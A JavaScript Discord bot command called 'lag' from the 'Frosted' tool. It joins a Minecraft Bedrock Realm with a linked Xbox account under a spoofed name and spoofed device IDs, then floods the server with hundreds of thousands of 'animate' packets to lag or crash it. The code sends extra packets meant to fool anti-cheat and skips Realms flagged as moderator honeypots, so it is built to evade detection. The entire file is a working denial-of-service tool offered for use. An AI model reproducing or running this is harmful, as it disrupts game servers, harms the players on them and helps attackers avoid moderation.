const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs');
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm,getrealminfo,onlineusers } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { Authflow, Titles } = require("prismarine-auth");
const skinData = require('../../data/client/jenny.json')

module.exports = {
    data: new SlashCommandBuilder()
        .setName("lag")
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .setDescription("Lag Nearby Clients ")
        .addIntegerOption(option =>
            option.setName('account')
                .setDescription('Account you wanna use')
                .setRequired(true)
                .addChoices(
                    { name: 'Account 1', value: 1 },
                    { name: 'Account 2', value: 2 },
                    { name: 'Account 3', value: 3 }))
        .addStringOption(option =>
            option.setName('invite')
                .setDescription('Realm invite code or Realm ID')
                .setRequired(true)
                .setMinLength(8)
                .setMaxLength(15))
        .addIntegerOption(option =>
                    option.setName("duration")
                    .setDescription("How Long to lag the Realm")
                    .setRequired(true)
                    .setMinValue(5)
                    .setMaxValue(500)
                )
        .addStringOption(option =>
                    option.setName('namespoof_name')
                        .setDescription('Realm invite code')
                        .setRequired(false)
                        .setMinLength(1)
                        .setMaxLength(40)),
    async execute(interaction) {
        const invite = interaction.options.getString('invite');
        const namespoof = interaction.options.getString('namespoof_name') || "discord.gg/frosted"
        const duration = interaction.options.getInteger('duration');
        let disconnected = false;
        const account = interaction.options.getInteger('account')
        try {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Frosted Lag (r)")
                        .setDescription(`Loading data, this may take a few seconds depending on the workload.`)
                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                        .setThumbnail(config.embeds.footerurl)
                        .setColor(config.embeds.color)
                ],ephemeral: true,
            });

            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `X Account Not Linked X`,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: { text: "e" },
                        },
                    ],
                });
                return;
            }

            const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
            if (whitelist.includes(invite)) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
              // first try for making honeypot checks
            if (invite.length === 8) { 
                return;
            }
            const alert = "<a:alert:1324939657015726111>"
            const club = await dumprealm(invite);
            const realmInfo = await onlineusers(club.clubId, interaction);
            const herm = await getrealminfo(invite);
            const honeypotUsers = JSON.parse(fs.readFileSync('honeypot.json', 'utf8'));
            const currentUsers = realmInfo.ingameMembers.map(member => member.gamerTag.toLowerCase());
            const detectedUser = honeypotUsers.find(user => currentUsers.includes(user.toLowerCase()));
            
            if (detectedUser) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle(alert + "Honeypot realm Detacted" + alert)
                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `One or Multiple person in this Realm are on the Honeypot List`")
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
            
            const ownerGamertag = herm.owner.gamertag.toLowerCase();
            if (honeypotUsers.includes(ownerGamertag)) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle(alert + "Honeypot realm Detacted" + alert)
                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `The Owner of this Realm is in the Honeypot List`")
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
            
            if (realmInfo.club.membersCount < 7) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle(alert + "Honeypot realm Detacted" + alert)
                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `Realm has to less Members < Required: 7`")
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
            
            if (club.server.playersonline === 1 || club.server.maxplayers === 2) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle(alert + "Honeypot realm Detacted" + alert)
                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `To less Players are online on this Realm < Required : 2`")
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
            
            const realm = await dumprealm(invite);
            if (!realm) {
                console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Invalid code: realm not found or account banned.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }
            const crypto = require("node:crypto");
            const curve = "secp384r1";
            const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
            const bot = new Authflow(
                interaction.user.id, 
                path.resolve(`./data/client/frosted/${interaction.user.id}/profile${account}`), 
                {
                    flow: 'live',
                    authTitle: 'MinecraftNintendoSwitch',
                    deviceType: 'Nintendo',
                    doSisuAuth: true
                }
            );
            
            async function imhungry() {
                try {
                    const xboxToken = await bot.getXboxToken() // xbox :p
                    await bot.getMinecraftBedrockToken(keypair) // bedrock token bc it migh be banned and the xbl one not
                    console.log('Susesfull Refreshed Token:', xboxToken);
                    return xboxToken;
                } catch (error) {
                    console.error('Error while Refrshing', error);
                    return interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                }
            }
            
            (async () => {
                console.log('Refreshing Token...');
                
                const token = await imhungry();
                if (token) {
                    console.log('Susessfull Refreshd Token');
                    
                } else {
                    console.log('Error Refreshing Token');
                    return interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                }
            })();

            const client = createClient({
                profilesFolder: `./data/client/frosted/${interaction.user.id}/profile${account}`,
                username: interaction.user.id,
                offline: false,
                realms: {
                    ...(invite.length === 8
                        ? { realmId: invite }
                        : { realmInvite: invite })
                },
                skinData: {
                    DeviceOS: 12,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: genrandomstring(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: namespoof,
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                    ...skinData // costume skin for less detaction
                },
                skipPing: true
            });

            client.on('error', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client error: ${err.message || err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Error occurred: ${err.message || 'Unknown error'}`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
                client.close
                ();
            });
            
            let runtimeEntityId;

            client.on('start_game', (packet) => { // Small littel Hack to make Bot less Detactebel
              runtimeEntityId = packet.runtime_entity_id
              console.log(`Runtime Entity ID: ${runtimeEntityId}`);
            });
            client.on('start_game', (packet) => {
            client.queue('serverbound_loading_screen', { // sends the "is loading in Packet"
              "type": 1
            })
            client.queue('serverbound_loading_screen', { // Removes the immortal status of the Bot
              "type": 2
            })
            client.queue('interact', {  // Verify the Movement so Server sees us as a Real Player !
              "action_id": "mouse_over_entity",
              "target_entity_id": 0n,
              "position": {
                "x": 0,
                "y": 0,
                "z": 0
              }
            
            })
            client.queue('set_local_player_as_initialized', { // almost same as the first but mc is goofy and needs more packets, do i know ? nope !
              "runtime_entity_id": `${runtimeEntityId}`
            })
            client.queue("animate", {//  like a spoof to anti cheats :p
                action_id: 1, // making your arm swing 
                runtime_entity_id: packet.runtime_entity_id});
            })

            client.on('start_game', async (packet) => {
                console.log(`${colors.green}[Realm Watcher]${colors.cyan}>> User ${interaction.user.username}/${interaction.user.id} join Realm ${realm.name}/${invite}`)
                try {
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('Frosted Lag (r)')
                                .setDescription(`Joined and started to crash ${realm.name} - ${invite}. Disconnecting in 10 seconds...`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });

                    setTimeout(() => {
                        if (disconnected) return;
                        for (let i = 0; i < 500000; i++) {    
                        client.write("animate", {
                            action_id: 4,
                            runtime_entity_id: packet.runtime_entity_id});
                            
                        client.write("animate", {//  like a spoof to anti cheats :p
                            action_id: 1, // making your arm swing 
                            runtime_entity_id: packet.runtime_entity_id});
                        client.write("animate", {
                            action_id: 4,
                            runtime_entity_id: packet.runtime_entity_id});
                                        
                        client.write("animate", {//  like a spoof to anti cheats :p
                            action_id: 1, // making your arm swing 
                            runtime_entity_id: packet.runtime_entity_id});                                        
                        }
                        
                    }, 0);

                    setTimeout(() => {
                        if (!disconnected) {
                            client.disconnect();
                            interaction.editReply({
                                embeds: [
                                    new EmbedBuilder()
                                        .setTitle('Frosted Lag (r)')
                                        .setDescription(`Client disconnected from ${realm.name}. Crash successful.`)
                                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                        .setThumbnail(config.embeds.footerurl)
                                        .setColor(config.embeds.color)
                                ]
                            });
                            disconnected = true;
                        }
                    }, duration * 1000);
                } catch (error) {
                    console.error(error);
                    throw error;
                }
            });

            client.on('close', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client closed: ${err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Connection closed. Crash completed.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            });
        } catch (err) {
            console.error(err);
        }
    }
};

function genrandomstring(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}
